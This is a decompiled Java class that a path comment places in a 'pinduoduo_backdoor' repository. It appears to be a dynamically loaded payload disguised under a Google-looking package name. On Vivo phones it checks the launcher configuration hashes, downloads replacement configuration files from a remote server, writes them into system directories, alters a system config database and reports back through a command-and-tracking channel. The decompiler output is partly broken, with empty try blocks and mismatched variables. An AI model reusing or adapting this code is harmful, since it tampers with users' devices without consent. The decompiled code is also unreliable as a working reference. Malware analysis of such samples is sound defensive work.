package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.text.TextUtils;
import android.util.Log;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import org.json.JSONException;
import org.json.JSONObject;

public final class c {
  private static String a;
  
  private static String a(String paramString) {
    byte[] arrayOfByte = null;
    MessageDigest messageDigest = null;
    try {
      byte[] arrayOfByte1;
      FileInputStream fileInputStream = new FileInputStream(paramString);
      try {
        messageDigest = MessageDigest.getInstance("MD5");
        arrayOfByte = new byte[1024];
        while (true) {
          int i = fileInputStream.read(arrayOfByte);
          if (-1 != i) {
            messageDigest.update(arrayOfByte, 0, i);
            continue;
          } 
          String str = a(messageDigest);
          try {
            return str;
          } catch (IOException null) {
            return str;
          } 
        } 
      } catch (Exception null) {
        return "";
      } finally {
        arrayOfByte = null;
        exception = iOException;
        arrayOfByte1 = arrayOfByte;
      } 
      throw arrayOfByte1;
    } catch (Exception exception1) {
    
    } finally {
      paramString = null;
    } 
    if (paramString != null)
      try {
        paramString.close();
      } catch (IOException iOException) {} 
    return "";
  }
  
  private static String a(MessageDigest paramMessageDigest) {
    byte[] arrayOfByte = paramMessageDigest.digest();
    StringBuilder stringBuilder = new StringBuilder();
    if (arrayOfByte == null || arrayOfByte.length == 0)
      return null; 
    int j = arrayOfByte.length;
    for (int i = 0; i < j; i++) {
      String str = Integer.toHexString(arrayOfByte[i] & 0xFF);
      if (str.length() < 2)
        stringBuilder.append(0); 
      stringBuilder.append(str);
    } 
    return stringBuilder.toString();
  }
  
  private static Map<String, String> a(boolean paramBoolean, String paramString) {
    String str;
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    if (paramBoolean) {
      hashMap.put("status", "1");
      str = "true";
    } else {
      hashMap.put("status", "0");
      str = "false";
    } 
    hashMap.put("result", str);
    hashMap.put("details", paramString);
    return (Map)hashMap;
  }
  
  private static void a(Context paramContext) {
    Intent intent = new Intent("com.vivo.daemonService.unifiedconfig.update_finish_broadcast_BBKLauncher2");
    intent.setPackage("com.bbk.launcher2");
    try {
      paramContext.sendBroadcast(intent);
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private static void a(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject();
    CmdData cmdData = new CmdData(1005, a, "client");
    try {
      jSONObject.put("details", paramString);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
      TrackUtils.submitTrack(paramContext, 22, a(true, paramString));
      return;
    } catch (JSONException jSONException) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONException.toString(), null));
      TrackUtils.submitTrack(paramContext, 22, a(false, paramString));
      return;
    } 
  }
  
  public static void a(Context paramContext, JSONObject paramJSONObject) {
    File file = b.a();
    byte b2 = -1;
    byte b1 = b2;
    if (file != null) {
      b1 = b2;
      if (file.exists())
        if (file.length() == 0L) {
          b1 = b2;
        } else {
          String str = b.a(file);
          if (str == null) {
            b1 = b2;
          } else {
            ArrayList<a> arrayList2 = new ArrayList();
            ArrayList<a> arrayList1 = new ArrayList();
            arrayList2.add(new a(1947, "7069150474AAFCB9541AB6559D6A9108", null));
            arrayList2.add(new a(1949, "4E4F11EACFA4B2A617F480DE4CE84414", null));
            Iterator<a> iterator2 = arrayList2.iterator();
            while (iterator2.hasNext()) {
              if (TextUtils.equals(((a)iterator2.next()).a, str)) {
                b1 = 0;
                break label31;
              } 
            } 
            arrayList1.add(new a(507, "F69C264291A684338B6DE40793D93CA5", "B79A16900B6F91FD004D22387EF3B47E"));
            arrayList1.add(new a(1220, "4831DAE78045897B3EE9D4E4B14C09AB", "06100EDA5750BADBB5FCD89BCBEA6D38"));
            arrayList1.add(new a(1221, "FE78B912C7FEB95A32127AB56C0075D9", "F9A7D5D068577538901783B192720800"));
            arrayList1.add(new a(1223, "56A41F0650DDE5E24A98A750A8E58246", "8BA543A1AEFEBFAA13187F9AB7202A96"));
            arrayList1.add(new a(1946, "C11B137D5CFF7632A23C2213511E0870", "91AB6A0B29E4A0175F792E232BAF2922"));
            arrayList1.add(new a(1948, "31D402DB994D478966DD0C72BDEAD2A2", "75BC643A7D7E7CF393EDF1B60DE95921"));
            arrayList1.add(new a(2303, "76BF2D4CFC655EF6E3F5721AF9DEC461", "2AF6BE62047289D43B57BB18CD6723BF"));
            arrayList1.add(new a(2304, "2B7A141406D673B7EDB9DB3DC4D73B61", "B53CABF3DF5122EE48C8732C5AEC0764"));
            arrayList1.add(new a(2751, "1A2F4590EDE3E472DD1772A235251CA4", "C35CE886277459DA756C097E07CD8871"));
            arrayList1.add(new a(1223, "DFC583837962910FB0F92B3F6A03D917", "EA3C53C24A61C1525C6902115D5A6F5D"));
            arrayList1.add(new a(1948, "CEDB670E508911590509B81CA0E0C560", "BB4AF7C41FD8292E0139FDE60D706D4C"));
            arrayList1.add(new a(2303, "8CB2CDF69C364A35A4872D68A3EA8223", "038393FABE4CFAB5321A677FDC78B701"));
            arrayList1.add(new a(2304, "8DDCE584F2082F52ED06E2971BD309D6", "2AE317ED4878AF26249F25BC941EFB45"));
            arrayList1.add(new a(3507, "65B8FEC83A0944C8FEE20197F5BFA319", "CB3BE0B0A6D8A2E7E53EEFE4D4E46DCA"));
            Iterator<a> iterator1 = arrayList1.iterator();
            label31: while (true) {
              if (iterator1.hasNext()) {
                if (TextUtils.equals(((a)iterator1.next()).b, str)) {
                  b1 = 1;
                  break;
                } 
                continue;
              } 
              b1 = 2;
              break;
            } 
          } 
        }  
    } 
    a = paramJSONObject.optString("uuid");
    if (b1 == 2) {
      b(paramContext, paramJSONObject);
      return;
    } 
    a(paramContext, "already, result code: ".concat(String.valueOf(b1)));
  }
  
  private static void a(String paramString1, String paramString2) {
    byte[] arrayOfByte = null;
    FileNotFoundException fileNotFoundException = null;
    Exception exception2 = null;
    try {
    
    } catch (FileNotFoundException null) {
      return;
    } catch (Exception exception) {
    
    } finally {
      paramString2 = null;
      arrayOfByte = null;
      exception1 = exception2;
      if (exception1 != null)
        try {
          exception1.close();
        } catch (IOException iOException) {} 
    } 
    if (exception1 != null)
      try {
        exception1.close();
      } catch (IOException iOException) {} 
    if (paramString2 != null)
      try {
        paramString2.close();
        return;
      } catch (IOException iOException) {
        return;
      }  
  }
  
  private static boolean a() {
    Exception exception2 = null;
    ContentValues contentValues = null;
    try {
      SQLiteDatabase sQLiteDatabase = SQLiteDatabase.openDatabase("/data/user_de/0/com.vivo.abe/databases/unifiedconfig.db", null, 0);
    } catch (Exception exception) {
    
    } finally {
      if (exception1 != null)
        try {
          exception1.close();
        } catch (Exception exception) {} 
    } 
    if (SYNTHETIC_LOCAL_VARIABLE_2 != null)
      try {
        SYNTHETIC_LOCAL_VARIABLE_2.close();
        return false;
      } catch (Exception exception) {
        return false;
      }  
    return false;
  }
  
  private static boolean a(Context paramContext, JSONObject paramJSONObject, String paramString) {
    if (paramJSONObject == null)
      return false; 
    String str1 = paramJSONObject.optString("modify_md5");
    String str2 = paramJSONObject.optString("url_suffix");
    File file = new File(paramContext.getFilesDir(), "xseai10_temp.tmp");
    try {
      Utils.downloadFile(paramContext, "1", str2, file, str1);
      str2 = String.format("data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { paramString });
      String str = String.format("data/bbkcore/BBKLauncher2_custom_%s_temp.xml", new Object[] { paramString });
      a(file.getPath(), str);
      paramString = a(str);
      File file1 = new File(str);
      if (TextUtils.equals(paramString, str1)) {
        file1.renameTo(new File(str2));
        try {
          file.delete();
        } catch (Exception null) {}
        try {
          file1.delete();
          return true;
        } catch (Exception null) {
          return true;
        } 
      } 
      b((Context)exception, "copy_fail");
      try {
        file.delete();
        return false;
      } catch (Exception exception) {
        return false;
      } 
    } catch (Exception exception1) {
      StringBuilder stringBuilder = new StringBuilder(" down_load_fail ");
      stringBuilder.append(exception1.getMessage());
      b((Context)exception, stringBuilder.toString());
      return false;
    } 
  }
  
  private static void b(Context paramContext, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(1005, a, "client"), paramString, null));
    TrackUtils.submitTrack(paramContext, 22, a(false, paramString));
  }
  
  private static void b(Context paramContext, JSONObject paramJSONObject) {
    Cursor cursor2 = null;
    Cursor cursor1 = null;
    try {
      Cursor cursor = paramContext.getApplicationContext().getContentResolver().query(Uri.parse("content://com.vivo.abe.unifiedconfig.provider/configs"), null, null, new String[] { "BBKLauncher2", "1", "1.0", "com.bbk.launcher2_configs" }, null);
      if (cursor != null) {
        StringBuilder stringBuilder;
        cursor1 = cursor;
        cursor2 = cursor;
        if (cursor.getCount() > 1) {
          cursor1 = cursor;
          cursor2 = cursor;
          stringBuilder = new StringBuilder("cursor_count_");
          cursor1 = cursor;
          cursor2 = cursor;
          stringBuilder.append(cursor.getCount());
          cursor1 = cursor;
          cursor2 = cursor;
          b(paramContext, stringBuilder.toString());
          if (cursor != null)
            try {
              cursor.close();
              return;
            } catch (Exception null) {
              return;
            }  
          return;
        } 
        cursor1 = cursor;
        cursor2 = cursor;
        int i = cursor.getCount();
        if (i == 0) {
          cursor1 = cursor;
          cursor2 = cursor;
          a((Context)exception, "start_add");
          cursor1 = cursor;
          cursor2 = cursor;
          if (a((Context)exception, stringBuilder.optJSONObject("2304"), "2304")) {
            cursor1 = cursor;
            cursor2 = cursor;
            if (a()) {
              cursor1 = cursor;
              cursor2 = cursor;
              a((Context)exception, "success");
              cursor1 = cursor;
              cursor2 = cursor;
              a((Context)exception);
            } else {
              cursor1 = cursor;
              cursor2 = cursor;
              b((Context)exception, "insert_fail");
            } 
          } else {
            cursor1 = cursor;
            cursor2 = cursor;
            b((Context)exception, "replace_fail");
          } 
          if (cursor != null)
            try {
              cursor.close();
              return;
            } catch (Exception null) {
              return;
            }  
          return;
        } 
        while (true) {
          cursor1 = cursor;
          cursor2 = cursor;
          if (cursor.moveToNext()) {
            cursor1 = cursor;
            cursor2 = cursor;
            i = cursor.getInt(cursor.getColumnIndex("id"));
            cursor1 = cursor;
            cursor2 = cursor;
            JSONObject jSONObject = stringBuilder.optJSONObject(String.valueOf(i));
            if (jSONObject != null) {
              cursor1 = cursor;
              cursor2 = cursor;
              if (a((Context)exception, jSONObject, String.valueOf(i))) {
                cursor1 = cursor;
                cursor2 = cursor;
                a((Context)exception);
                cursor1 = cursor;
                cursor2 = cursor;
                a((Context)exception, "success");
                continue;
              } 
              cursor1 = cursor;
              cursor2 = cursor;
              b((Context)exception, "replace_fail");
              continue;
            } 
            cursor1 = cursor;
            cursor2 = cursor;
            b((Context)exception, "can_not_find_config_".concat(String.valueOf(i)));
            continue;
          } 
          break;
        } 
      } else {
        cursor1 = cursor;
        cursor2 = cursor;
        b((Context)exception, "cursor_null");
      } 
      if (cursor != null)
        try {
          cursor.close();
          return;
        } catch (Exception exception) {
          return;
        }  
    } catch (Exception exception1) {
      cursor1 = cursor2;
      b((Context)exception, Log.getStackTraceString(exception1));
      if (cursor2 != null)
        try {
          cursor2.close();
          return;
        } catch (Exception exception2) {
          return;
        }  
    } finally {}
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */